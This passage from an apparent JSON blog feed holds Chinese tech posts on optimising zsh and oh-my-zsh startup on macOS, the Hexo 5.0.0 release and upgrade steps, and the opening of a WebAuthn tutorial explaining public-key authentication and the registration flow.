<code>$variable[(I)keyword]</code>，前者是从左往右寻找、后者是从右往左寻找，返回值为第一个匹配的首字符位置，当没有匹配时返回值则是变量的最终位置，也就是说当找不到匹配时 <code>(i)</code> 会返回字符串的长度、而 <code>(I)</code> 会返回 0。因此只需要从右往左寻找、判断返回值是否为 0 即可，搭配将数字转化为布尔值的 <code>(( ))</code> 就可以写出又快又漂亮的条件语句。</p>\n<h3>变量字符串替换</h3>\n<p>当需要截断或者替换字符串时，大部分人第一时间会想到 <code>sed</code> ，因当此需要替换变量中的字符时自然而然的会使用 <code>echo | sed</code>。比如，在 macOS 中主机名 <code>$HOST</code> 变量通常以 <code>.local</code> 结尾：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span>Sukka-MBP.local</code></pre>\n<p>如果要显示 <code>Sukka-MBP</code> （在 prompt 中常常会用到）就需要写成：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">$HOST</span> | sed -e <span class=\"hljs-string\">\"s/.local//\"</span>Sukka-MBP</code></pre>\n<p>但是，强大的 zsh 内置了简单的变量字符串替换语法，使用下述命令可以达到相同的效果：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/}</span>Sukka-MBP$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${HOST/.local/.foxtail}</span>Sukka-MBP.foxtail</code></pre>\n<h2>其它优化手段</h2>\n<h3>禁用多余的插件</h3>\n<p>oh my zsh 在 Wiki 里说「Add wisely, as too many plugins slow down shell startup」。通过 profiling 可以发现一些插件（如 <code>git</code> 插件）执行耗时也不短。考虑到 oh my zsh 内置的 <code>git</code> 插件只是一些 alias、大部分我都用不到，因此将其从 <code>plugins</code> 数组中移除。</p>\n<h3>避免产生子进程</h3>\n<p>在 shell 中有不少语法会产生子进程。由于这些不受控制的子进程可能会产生其它子进程、从而导致潜在的巨大开销。常见的会产生子进程的语法有是 <code>eval</code> 和 Command substitution，在编写 <code>.zshrc</code> 时应该尽量避免使用它们。</p>\n<p>例如，Homebrew 是通过 Ruby —— 一种没有性能优势的语言编写的，而且 Homebrew 的开发者甚至因为不会翻转二叉树而错失了 Google 的 offer（想必大家大体可以猜得出 Homebrew 中的负优化），因此在 zsh 启动时产生一个子进程运行 Homebrew 将是不能忍受的，绝大部分使用 Homebrew 的人都不会改变 Homebrew 的路径，因此与其在 <code>.zshrc</code> 中使用 <code>$(brew --prefix)</code>，不如直接将命令执行的结果（<code>/usr/local</code>）直接写在 <code>.zshrc</code> 中。</p>\n<h3>启用 ZSH_DISABLE_COMPFIX</h3>\n<p>oh my zsh 内置了安全功能、避免 oh my zsh 插件使用不安全的目录和文件，但是这意味着插件在加载时需要通过一系列 security checker。通过禁用安全功能 （<code>export ZSH_DISABLE_COMPFIX=\"true\"</code>）可以使 zsh 启动速度加快 0.06s。微不足道，但值得一试。</p>\n<h2>针对 macOS 的优化</h2>\n<h3>path_helper</h3>\n<p>和 Linux 不同，在 macOS 上 zsh 启动序列的第一项为 <code>/etc/zprofile</code> 而不是 <code>~/.zprofile</code>。macOS 通过 <code>/etc/zprofile</code> 来调用 <code>path_helper</code>：</p>\n<pre><code class=\"hljs bash\">$ cat /etc/zprofile<span class=\"hljs-comment\"># System-wide .profile for sh(1)</span><span class=\"hljs-keyword\">if</span> [ -x /usr/libexec/path_helper ]; <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-built_in\">eval</span> `/usr/libexec/path_helper -s`<span class=\"hljs-keyword\">fi</span><span class=\"hljs-keyword\">if</span> [ <span class=\"hljs-string\">\"<span class=\"hljs-variable\">${BASH-no}</span>\"</span> != <span class=\"hljs-string\">\"no\"</span> ]; <span class=\"hljs-keyword\">then</span>  [ -r /etc/bashrc ] &amp;&amp; . /etc/bashrc<span class=\"hljs-keyword\">fi</span></code></pre>\n<p>而 <code>path_helper</code> 又会读取 <code>/etc/paths</code> 、<code>/etc/paths/d</code>、<code>etc/manpaths</code> 和  <code>etc/manpaths.d</code>、并将其添加到 <code>$PATH</code> 和 <code>$MANPATH</code> 变量中。通过 <code>path_helper</code> macOS 提供了一种快速在不同 shell 中共享  <code>$PATH</code> 和 <code>$MANPATH</code> 的方法。过去，<code>path_helper</code> 是一个 <a href=\"https://mjtsai.com/blog/2009/04/01/slow-opening-terminal-windows\">运行速度很慢的 shell 脚本</a> 以至于有人制作了 <a href=\"https://gist.github.com/mkhl/123525\">专门的 patch</a>、甚至 <a href=\"https://github.com/mgprot/path_helper\">使用 Perl</a> 重写了一个替代品。不过 macOS 意识到了这个问题，现在 <code>path_helper</code> 不再是一个脚本而是一个预编译好的二进制文件。如果你通过 profiling 发现 <code>path_helper</code> 有在拖累 zsh 启动，那么可以考虑放弃使用 <code>/etc/paths/d</code>、而是在 <code>.zshrc</code> 中直接维护 <code>$PATH</code>。</p>\n<h3>login process</h3>\n<p>默认在启动、终端登陆 shell 时会触发 macOS 的 <code>login -fp username</code>。这一操作会调用 <code>syslog()</code> 函数向 <code>/var/log/asl</code> 写入日志、并读取上一次登录记录、以 <code>Last login</code> 的形式显示出来。你可以使用下述命令证实这一行为：</p>\n<pre><code class=\"hljs bash\">ps -ef | grep login</code></pre>\n<p>如果想要通过减少日志写入来加快 zsh 启动速度，可以修改 <code>etc/asl.conf</code> 配置文件中定义的日志等级。</p>\n<p>不少文章也提到，修改 iTerm2 设置中的 <code>Login Command</code> 为 <code>/bin/zsh</code> 可以加快 zsh 启动速度，本质上也是绕过了上述读取和写入日志的环节。</p>\n<blockquote><p>ASL 即 <strong>A</strong>pple <strong>S</strong>ystem <strong>L</strong>og，macOS 10.12 起被弃用，但是仍有系统组件在使用这一接口。</p></blockquote>\n<h2>尾声</h2>\n<p>经过一系列优化，我终于让 zsh 启动速度提升了十倍，速度甚至不亚于 fish 等以性能著称的 shell：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-keyword\">for</span> i <span class=\"hljs-keyword\">in</span> $(seq 1 5); <span class=\"hljs-keyword\">do</span> /usr/bin/time /bin/zsh -i -c <span class=\"hljs-built_in\">exit</span>; <span class=\"hljs-keyword\">done</span>        0.14 real         0.08 user         0.05 sys        0.12 real         0.07 user         0.04 sys        0.12 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys        0.13 real         0.07 user         0.04 sys</code></pre>\n<p>如果对我的 <code>.zshrc</code> 文件感兴趣，可以 <a href=\"https://github.com/SukkaW/dotfiles/blob/master/_zshrc/macos.zshrc\">前往 GitHub 查看我开源的 dotfiles</a>。</p>\n<div class=\"license\"> <div class=\"license-title\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">https://blog.skk.moe/post/make-oh-my-zsh-fly/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-08-10</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/make-oh-my-zsh-fly/"},{"title":"Hexo 5.0.0 正式发布","date":"2020-07-24 02:24:00","description":"\n<p>Node.js 上最快的静态站点生成器 Hexo 发布了 5.0.0 版本。作为 Hexo 核心团队成员，让我为大家介绍一下 Hexo 5.0.0 中的新特性，以及如何从 Hexo 4.x 版本升级到 Hexo 5.0.0。</p>\n<h2>新特性</h2>\n<h3>通过 npm 安装主题</h3>\n<p>过去，安装 Hexo 主题需要 <code>git clone</code> 或者下载、解压 zip；更新主题时还需要迁移 <code>_config.yml</code> 。Hexo 5.0.0 支持通过 npm 安装主题。现在安装一个主题只需要三步：</p>\n<ul>\n<li><p>使用  <code>npm install hexo-theme-[主题的名称]</code> 即可安装主题；</p></li>\n<li>\n<p>在站点的 <code>_config.yml</code> 中指定主题的名称：<br><br></p>\n<pre><code class=\"hljs yaml\"><span class=\"hljs-attr\">theme:</span> <span class=\"hljs-string\">\"[主题的名称]\"</span></code></pre>\n</li>\n<li><p>在站点根目录下新建一个文件 <code>_config.[主题的名称].yml</code>，在该文件中填入主题的配置即可。</p></li>\n</ul>\n<p>对于主题的开发者、插件开发者，以及进阶的 Hexo 用户来说，这是你们想要了解的技术细节：</p>\n<ul>\n<li>为了保证向后兼容性，Hexo 依然支持从 <code>themes/[主题的名称]</code> 目录加载主题。其中，<code>themes/[主题的名称]</code> 的优先级高于 <code>node_modules/hexo-theme-[主题的名称]</code>。也就是说，只有当 Hexo 发现 <code>themes/[主题的名称]</code> 目录不存在时，才会从  <code>node_modules/hexo-theme-[主题的名称]</code> 目录中加载主题。</li>\n<li>Hexo 5.0.0 新增了通过站点根目录下 <code>_config.[主题的名称].yml</code> 文件配置主题的功能。这是除主题目录下的 <code>_config.yml</code> 文件、以及站点配置文件的 <code>theme_config</code> 字段外第三种配置主题的方式。</li>\n<li>为保证向后兼容性，Hexo 会按照如下优先级 deep merge 三份主题配置：<code>站点配置文件的 theme_config 字段 &gt; 站点根目录下的 _config.[主题的名称].yml &gt; 主题目录下的 _config.yml</code>。因此，我们建议主题开发者尽量限制配置文件层级为 1 级，避免在 deep merge 时更深层级的配置项会被合并而不是被覆盖。</li>\n</ul>\n<h3>PrismJS 代码高亮支持</h3>\n<p>Hexo 5.0.0 新增了 PrismJS 代码高亮支持。</p>\n<p>相比 highlight.js 可以在 Node.js 环境执行（即：可在 Hexo 生成页面时进行代码高亮）不同，PrismJS 是一个轻量级的代码高亮库，绝大部分插件都依赖浏览器中执行。Hexo 为了尽可能兼容 PrismJS 的功能和插件，提供了「生成时渲染」和「浏览器渲染」两种模式：前者只需在主题之中引入 PrismJS 的 CSS 即可，但是无法使用大部分 PrismJS 的插件；后者需要在主题中同时引入 PrismJS 的 CSS 和 <code>prism.js</code>，但是可以兼容 PrismJS 大部分插件。</p>\n<p>关于 Hexo 主题的开发者适配 Hexo 的两种代码高亮的技术细节，我们专门撰写了 <a href=\"https://hexo.io/docs/syntax-highlight\">相关的文档页面</a> 以供参考。</p>\n<h3>静态 HTML 片段插入</h3>\n<p>插件开发者经常需要在页面中插入 HTML 片段：播放器插件需要往页面中插入 <code>player.css</code> 和 <code>player.js</code>，lazyload 插件的作者需要往页面中插入 <code>lazyload.js</code>，Live2D 插件的作者需要往页面中插入对应的 CSS 和 JS，等等。Hexo 5.0.0 新增了一个插件 API 接口 <code>Injector</code>，用于往页面的 <code>&lt;head&gt;</code> 和 <code>&lt;body&gt;</code> 标签中注入静态 HTML 片段。这一功能支持：</p>\n<ul>\n<li>在 <code>&lt;head&gt;</code> 之后、<code>&lt;/head&gt;</code> 之前、<code>&lt;body&gt;</code> 之后 和 <code>&lt;/body&gt;</code> 之前四个位置插入代码。</li>\n<li>支持只在特定页面注入 HTML 片段 —— 插件开发者可以仅往文章页面插入 HTML 片段而不影响其他页面如首页和归档。</li>\n</ul>\n<p>插件开发者请参考 Hexo 的 [Injector API 文档] 了解具体使用方法。</p>\n<h3>其他新特性</h3>\n<p>除上述三个重磅功能外，Hexo 还新增了其他功能，如：</p>\n<ul>\n<li>标签插件 API 新增 <code>unregister</code>å 方法</li>\n<li>\n<code>tagcloud</code> 辅助函数新增支持自定义 class 属性和 level</li>\n<li>\n<code>feed_tag</code> 辅助函数增加对 hexo-generator-feed 插件的兼容</li>\n<li>\n<code>youtube</code> 标签插件新增对 YouTube 播放列表的支持，以及可选使用 <code>www.youtube-nocookie.com</code> 域名</li>\n<li>\n<code>post_link</code> 标签插件在找不到对应文章时将会显示警告信息</li>\n<li>\n<code>post_permalink</code> 配置项新增支持 <code>:second</code> 属性</li>\n<li>当文章的标签插件出现渲染错误时，报错信息将会显示出错文件的路径</li>\n</ul>\n<h2>修复的 Bug</h2>\n<ul>\n<li>修复了 数个相邻的标签插件 无法渲染的 Bug</li>\n<li>修复了 文章中的代码块由于包含大括号（<code>{</code> 和 <code>}</code>）导致的渲染失败</li>\n<li>修复了 包含 Source Map 的 Hexo 插件无法加载的 Bug</li>\n<li>修复了 <code>code</code> 标签插件无法解析 <code>wrap</code> 选项的问题</li>\n<li>当 <code>post_asset_folder</code> 功能启用时，<code>hexo new</code> 命令将不再生成错误的 <code>index</code> 目录</li>\n</ul>\n<h2>性能改进</h2>\n<p>一如既往，Hexo 5.0.0 也带来了一系列性能改进，以提升 Hexo 的渲染性能。</p>\n<ul>\n<li>改进了标签插件的渲染性能</li>\n<li>优化了 <code>meta[generator]</code> 标签注入的逻辑</li>\n<li>优化为外部链接添加 <code>rel=noopenner</code> 和 <code>target=\"_blank\"</code> 功能的性能</li>\n<li>确保 <code>after_render:html</code> Filter 在每个页面只执行一次</li>\n<li>优化了 Filter API 的执行速度</li>\n<li>延迟加载代码高亮，减少 Hexo 启动用时</li>\n<li>当执行 <code>hexo clean</code> 时不再加载无关的插件</li>\n</ul>\n<h2>从 Hexo 4.x 升级到 Hexo 5.x</h2>\n<p>Hexo 5.0.0 引入了少数不向后兼容的功能，因此当你升级到 Hexo 5.0.0 时，需要遵循以下步骤进行迁移：</p>\n<h3>升级 Node.js</h3>\n<p>Hexo 5.0.0 不再支持 Node.js 8 及更低版本。为了使用 Hexo 5.0.0，请确保 Node.js 版本不低于 10.13.0。</p>\n<h3>文章 Front-Matter 不再支持 keywords 字段</h3>\n<p>过去这一字段被主要用于 <code>open_graph</code> 辅助函数。升级到 Hexo 5.0.0 后你无需去除现有文章的 Front-Matter 中的 <code>keywords</code> 字段，但这一字段将不会再起任何作用。</p>\n<h3>文章 Front-Matter 中 permalink 字段的行为</h3>\n<p>Hexo 5.0.0 修改了在文章的 Front Matter 中指定 <code>permalink</code> 字段的行为，与独立页面的 <code>permalink</code> 的行为一致。</p>\n<h3>全局变量中不再包含 Lodash</h3>\n<p>Hexo 5.0.0 去除了全局变量中的 Lodash，因此主题无法继续在模板中使用 Lodash。主题开发者应该遵循 <a href=\"https://github.com/you-dont-need/You-Dont-Need-Lodash-Underscore\">You-Dont-Need-Lodash-Underscore</a> 进行迁移。</p>\n<h3>用 updated_option 配置代替 use_date_for_updated</h3>\n<p>Hexo 4.0.0 提供的 <code>use_date_for_updated</code> 配置项现已被 <code>updated_option</code> 替代。</p>\n<ul>\n<li>\n<code>use_date_for_updated: true</code> 现在等价于 <code>updated_option: 'date'</code>。</li>\n<li>\n<code>use_date_for_updated: false</code> 现在等价于 <code>updated_option: 'mtime'</code>。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">Hexo 5.0.0 正式发布</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hexo-5/\">https://blog.skk.moe/post/hexo-5/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-07-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hexo-5/"},{"title":"谈谈 WebAuthn","date":"2020-03-23 14:57:59","description":"\n<p>WebAuthn，即 Web Authentication，是一个用于在浏览器上进行认证的 API，W3C 将其表述为 “An API for accessing Public Key Credentials”，即“一个用于访问公钥凭证的 API”。WebAuthn 很强大，强大到被认为是 Web 身份认证的未来（当然，也很复杂）。你有想过通过指纹或者面部识别来登录网站吗？WebAuthn 就能在保证安全和隐私的情况下让这样的想法成为现实。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/wwa.gif\" alt=\"通过 WebAuthn 调起 Windows Hello 登录网站\" width=\"1912\" height=\"966\" class=\"aligncenter size-full wp-image-2215\"></a>\n<p>你可以在<a href=\"https://webauthn.io/\" rel=\"noopener\">这个网站</a>自行体验 WebAuthn。或者，如果你有一个使用 WordPress 的站点，可以尝试一下 <a href=\"https://wordpress.org/plugins/wp-webauthn/\">WP-WebAuthn</a> 这款插件，它可以为你的站点启用 WebAuthn 登录。这是我为了写这篇文章而练手开发的插件，本文中的部分示例代码也来自这款插件。</p>\n<div class=\"mdx-github-cot\" data-mdxgithuba=\"yrccondor\" data-mdxgithubp=\"wp-webauthn\" data-mdxgithubg=\"https://api.github.com/\"><div class=\"mdx-github-wait-out-c2\"><div class=\"mdx-github-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://github.com/yrccondor/wp-webauthn\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<p>WebAuthn Level 1 标准已在 2019 年 3 月成为 W3C 推荐标准，而 Level 2 标准目前也已进入编辑草案阶段，但互联网上有关它的中文资料却仍然很少，国内也鲜有网站支持这一新标准。于是，在抱着各种英文资料和标准啃了几天以后，我折腾出了这篇文章。</p>\n<p>在这篇文章里，我将会从最基本的概念开始，逐渐深入 WebAuthn，直到解码公钥等深层细节。这可能是你能找到的有关 WebAuthn 最详细最基础的中文文章，也很可能是最长的。在开始之前，<strong>我强烈建议你打开菜单中的文章目录浏览一遍，以对这篇文章涉及的内容有所了解。</strong>如果你只是想了解如何简单地在你的项目中添加对 WebAuthn 的支持，那么“<a href=\"https://flyhigher.top/#webauthn-overview\">浅谈 WebAuthn</a>”部分就是你要找的；如果你想了解更多关于 WebAuthn 的底层细节，那么你可以继续阅读“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”部分。</p>\n<p>由于在本文写作时 WebAuthn Level 2 规范尚未定稿，<strong>这篇文章我们将只专注于 Level 1 规范。</strong></p>\n<p>这篇文章最后更新于 2020.9 ，在你读到这篇文章时，部分事实可能已经发生改变，请注意判断。</p>\n<p><strong>更新日志：</strong></p>\n<ul>\n<li>2021.1.16 添加 Chrome 开发工具信息</li>\n<li>2020.9.17 更新 iOS/iPad OS 兼容性信息</li>\n<li>2020.5.20 添加部分无用户名认证的平台兼容性内容</li>\n<li>2020.5.15 添加部分 <code>extensions</code> 相关内容与链接；添加全局凭证 ID 唯一内容；添加凭证 ID 查找相关内容；添加“从 U2F 认证迁移”一节</li>\n<li>2020.4.13 更新与修正 <code>userVerification</code> 相关内容；添加部分 Firefox 相关内容</li>\n<li>2020.3.23 文章发布</li>\n</ul>\n<p>那么让我们开始吧。<span></span></p>\n<h1>浅谈 WebAuthn</h1>\n<p>在这个部分里，我们将会从基础概念开始，了解有关 WebAuthn 和密码学的一些基础知识，并最终使用第三方库实现基础的 WebAuthn 认证。如果你已经对这些内容有所了解了，可以跳到“<a href=\"https://flyhigher.top/#deep-into-webauthn\">深入了解 WebAuthn</a>”继续阅读。</p>\n<h2>为什么使用 WebAuthn</h2>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/2.png\" alt=\"钓鱼邮件\" width=\"709\" height=\"693\" class=\"aligncenter size-full wp-image-2162\"></a>\n<p>相信你一定收到过类似的邮件吧？只要你点进那个最显眼的链接，你就会进入一个设置好的圈套——钓鱼网站。如果你一时糊涂在这类网站上填写了你的账号和密码，bingo，你的账号就不再是你的账号了。</p>\n<p>不过，就算你警惕心再强，也无法避免密码泄露事件。Twitter, Facebook 等都爆出过明文密码泄露事件，证明再大的公司或组织也无法避免密码泄露问题。雪上加霜的是，很大一部分用户都非常喜欢使用重复密码，这就导致一次密码泄露会牵连很多网站，用户的账户安全性完全无法得到保证。</p>\n<p>那么，有什么办法解决这些问题吗？<strong>彻底解决的方法只有一个，那就是抛弃密码。</strong>可是没有密码还怎么验证用户身份呢？这就是 WebAuthn 的用武之地了。</p>\n<p><del>没有密码的好时代，来临力！</del></p>\n<h2>什么是 WebAuthn</h2>\n<p>那么到底什么是 WebAuthn 呢？如开头所说，WebAuthn 是“一个用于访问公钥凭证的 API”，网站可以通过这个 API 进行一些高安全性的身份验证。WebAuthn 一个最常见的应用就是用于网站登录时的 2FA（双重因素验证）甚至是无密码登录。通过网页调用 WebAuthn，在不同平台下，<strong>我们可以实现通过 USB Key、指纹、面部甚至虹膜扫描来认证身份，同时确保安全和隐私。</strong></p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/4-3.png\" alt=\"WebAuthn 可使用的各种身份认证方式\" width=\"1294\" height=\"566\" class=\"aligncenter size-full wp-image-2213\"></a>\n<p>WebAuthn 标准是 FIDO2 标准的一部分，而 FIDO2 则是由 FIDO 联盟和 W3C 共同推出的 U2F（现称作 FIDO1）的后继标准，旨在增强网络认证的安全性。</p>\n<blockquote><p>你可能了解过 U2F，那么 U2F 和 FIDO2 的区别在哪里呢？从名字上可以看出，U2F，即“通用第二因素协议”，是专注于作为密码后的第二道屏障的，而 FIDO2 增加了单因素认证功能，这意味着使用 FIDO2 可以完全替代密码，真正实现无密码登录。</p></blockquote>\n<p>FIDO2 标准主要包括四个部分，其一是用于网站和访客设备交互的 WebAuthn，而 Client to Authenticator Protocol 2（CTAP2，客户端-认证器协议）作为 WebAuthn 的补充，则是用于访客的设备和认证器交互的协议。标准的其他两个部分则是 U2F 和 UAF 规范。在这篇文章中，我们只关心 WebAuthn，不会涉及 CTAP, U2F 和 UAF 的相关知识。如果你对这段话中的一些概念不了解，不要紧张，接下来我们就来谈谈 WebAuthn 中一些常用的术语和概念。</p>\n<blockquote><p>WebAuthn 只能在安全上下文中使用，也就是说，页面需要使用 HTTPS 协议或是处于 <code>localhost</code> 中。</p></blockquote>\n<h2>常用术语和概念</h2>\n<p>WebAuthn 中有许多不常碰到的术语，不过我只会在这里介绍一些常用的术语和概念——如果你只是希望做出一个简单的实现，那么了解这一段中的一些概念就足够了。同时，由于我实在没能找到一部分术语的通用翻译，有一些术语我按着自己的理解尽可能地翻译了，有任何问题请告诉我。</p>\n<p>在一个完整的 WebAuthn 认证流程中，通常有这么几个角色：</p>\n<ul>\n<li>Relying Party 依赖方 (RP) ：指服务提供方，即网站</li>\n<li>User 用户：正准备登录的你</li>\n<li>Authenticator 认证器：通常指 USB Key 或是设备内置的指纹扫描器、虹膜扫描器、面部识别装置等，正是它们在使用流程中代替了密码甚至是用户名</li>\n<li>User Agent 用户代理：通常指浏览器或系统，负责与认证器交互</li>\n</ul>\n<p>认证过程通常分为两种：</p>\n<ul>\n<li>Registration Ceremony 注册仪式：用户向账户上添加认证器</li>\n<li>Authentication Ceremony 验证仪式：用户通过已注册的认证器验证身份</li>\n</ul>\n<p>同时，认证过程中还会产生这些内容：</p>\n<ul>\n<li>Challenge 挑战：通常是一串随机字符串</li>\n<li>Public Key Credential 公钥凭证：由认证器产生的凭证，在技术上代替了密码</li>\n<li>Attestation 证明：注册时认证器产生的验证数据</li>\n<li>Assertion 断言：验证时认证器产生的验证数据</li>\n</ul>\n<blockquote><p><strong>请注意区分证明 (Attestation) 和断言 (Assertion)</strong>，特别是在这两个单词有些相似的情况下。在 WebAuthn 中，它们是不同过程中的类似概念，但并不相同。</p></blockquote>\n<p>如果你对于这些内容不是很理解，没有关系，我们会在“<a href=\"https://flyhigher.top/#how-to-webauthn\">使用流程</a>”一节中将这些概念放到实际情况中解释，你只要先区分这些概念即可。</p>\n<h2>安全性的基础</h2>\n<p>WebAuthn 为什么安全？和 HTTPS 一样，WebAuthn 使用非对称加密的思路来保证安全性，但侧重点又有所不同。要理解 WebAuthn 的认证流程，我们必须对非对称加密有所了解。如果你对非对称加密比较熟悉了，就直接跳到下一段吧。</p>\n<p>WebAuthn 的核心在于“认证”，即保证产生了凭证的认证器是用户的认证器，而不是第三方在伪造凭证。但为什么要使用非对称加密呢？我们可以先来看看对称加密。</p>\n<p>让我们假设小明和小红相互写信，见不到对方。这天小红突然想，给自己写信的人是不是真的小明呢？于是小红要求对方向小红证明自己是小明。怎么证明呢？他们商量出来这么一套方案：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明和小红商量一个统一的密码和密钥</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明用提前和小红商量好的密码和密钥加密文本后发回给小红</li>\n<li>小红使用相同的密码和密钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和密钥</li>\n</ol>\n<blockquote><p>在密码学中，我们通常把“加密算法”称为密码 (code)，和通常登录时用的密码 (password) 并非同一个概念。</p></blockquote>\n<p>在这种情况下，<strong>只要密钥不泄露</strong>，即拥有正确密钥的只有小明和小红，那么小红就能确定对方一定是小明。但这样的问题也很明显，如果小明和小红不能见面，那么他们就必须先以明文交换密码——<strong>在这个过程中一旦有人窃取到了密码，这个认证就无效了。</strong></p>\n<p>这时我们就需要使用<strong>非对称加密</strong>来拯救破碎的信任了。非对称加密的基础是一对密钥，也就是公钥和私钥，它们是互相关联但（几乎）无法互相推导的。在非对称加密的过程中，选择相同的密码后，使用私钥加密明文得到的密文只能由对应的公钥解密，无法使用私钥解密，同时这个过程反过来也是成立的。</p>\n<blockquote><p>本文的核心并不是非对称加密算法，因此不会详述非对称加密在数学上的证明，若有兴趣可以自行了解。</p></blockquote>\n<p>这就完美解决密钥泄露的问题了。让我们回过头来看之前的例子。现在小明和小红决定使用非对称加密来证明身份，过程如下：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明提前生成一对公私钥，将公钥发送给小红，私钥自己保管，同时商量好统一的密码</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明使用商量好的密码和自己的私钥加密文本，发送给小红</li>\n<li>小红使用相同的密码和小明的公钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和私钥</li>\n</ol>\n<p>在这种情况下，<strong>只要私钥不泄露</strong>，那么小红解密得到的文本和之前发送的一致，那么就可以证明收到的密文一定是由小明加密后发送过来的。而在整个过程中，私钥都没有离开过小明，更没有经过传输，也就几乎没有泄露的可能了。这时，小红终于可以确定对面和她通信的人的确是小明了。</p>\n<p>题外话：HTTPS 虽然也应用了非对称加密，但 HTTPS 更侧重于“加密”而非“认证”，因此思路上会有些许差异。要了解关于 HTTPS 和非对称加密的更多信息，你可以阅读我之前写的这篇文章：</p>\n<p></p>\n<div class=\"mdx-post-cot\" data-mdxposturl=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdx-post-wait-out-c2\"><div class=\"mdx-post-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<span></span>\n<h2>使用流程</h2>\n<p>了解了非对称加密，我们就可以来看看 WebAuthn 的认证流程了。</p>\n<p>和普通的密码一样，<strong>使用 WebAuthn 分为两个部分，注册和验证。</strong>注册仪式会在依赖方中将认证器的一些信息和用户建立关联；而验证仪式则是验证这些信息以登确保是用户本人在登录。根据上一节的思路，我们可以知道，注册仪式就是认证器生成一对公私钥，然后将公钥交给依赖方；而验证仪式是依赖方发送给认证器一段文本，要求认证器用自己的私钥加密后发回以验证。</p>\n<p>在实际情况中，WebAuthn 是基于<strong>挑战-应答模型</strong>工作的。要更好地理解，我们直接来看具体流程。先来看看注册的流程。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\" alt=\"WebAuthn 注册流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2224\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的注册请求</li>\n<li>依赖方向浏览器发送挑战、依赖方信息和用户信息</li>\n<li>浏览器向认证器发送挑战、依赖方信息、用户信息和客户端信息以请求创建公钥凭证</li>\n<li>认证器请求用户动作，随后创建一对公私钥，并使用私钥签名挑战（即证明），和公钥一起交给浏览器</li>\n<li>浏览器将签名后的挑战和公钥发送给依赖方</li>\n<li>依赖方用公钥验证挑战是否与发送的一致，如果成功则将公钥与用户绑定，注册完成</li>\n</ol>\n<p>我也做了一个交互式的 Demo，你可以对照流程来更好地理解。</p>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\">开始注册</button> <span></span></p>\n<div></div>\n<blockquote><p>注意，这个 Demo 和下方的 Demo 都只是一个本地模拟的简单示例，没有任何数据会被上传，当然也不会对数据进行验证。</p></blockquote>\n<p>而之后的验证流程如下：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\" alt=\"WebAuthn 验证流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full 